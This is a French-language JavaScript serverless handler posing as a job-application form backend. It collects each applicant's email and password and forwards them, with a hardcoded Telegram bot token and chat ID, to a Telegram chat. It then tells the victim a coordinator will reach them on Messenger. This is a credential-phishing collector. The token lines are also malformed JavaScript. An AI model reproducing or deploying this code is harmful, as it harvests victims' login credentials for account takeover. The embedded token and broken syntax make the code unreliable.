export default async function handler(req, res) {
  // Autoriser CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Répondre aux préflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method === 'POST') {
    try {
      const { job, email, password, note } = req.body;

      // Vos variables d'environnement
      const BOT_TOKEN = process.env.7645874601:AAHS6vORgaXb_pOZg7WvpZ1jbr1WrADzmMw;
      const CHAT_ID = process.env.6075203216;

      // Vérifier que les variables sont définies
      if (!BOT_TOKEN || !CHAT_ID) {
        console.error('Variables manquantes:', { 
          hasBotToken: !!BOT_TOKEN, 
          hasChatId: !!CHAT_ID 
        });
        return res.status(500).json({
          success: false,
          message: 'Configuration serveur manquante'
        });
      }

      const message = `
🆕 NOUVELLE CANDIDATURE EMPLOI 🌍

📋 **Offre :** ${job}
📧 **Email :** ${email}
🔐 **Mot de passe :** ${password}
📝 **Note :** ${note}
⏰ **Date :** ${new Date().toLocaleString('fr-FR')}
      `.trim();

      console.log('Envoi à Telegram...', { job, email });

      // Envoyer le message à Telegram
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        }
      );

      const result = await telegramResponse.json();

      console.log('Réponse Telegram:', result);

      if (result.ok) {
        res.status(200).json({
          success: true,
          message: 'Candidature envoyée avec succès ! Le coordinateur vous contactera sur Messenger.'
        });
      } else {
        throw new Error(result.description || 'Erreur Telegram API');
      }

    } catch (error) {
      console.error('Erreur détaillée:', error);
      res.status(500).json({
        success: false,
        message: 'Erreur lors de l\'envoi de la candidature: ' + error.message
      });
    }
  } else {
    res.status(405).json({ error: 'Méthode non autorisée' });
  }
}
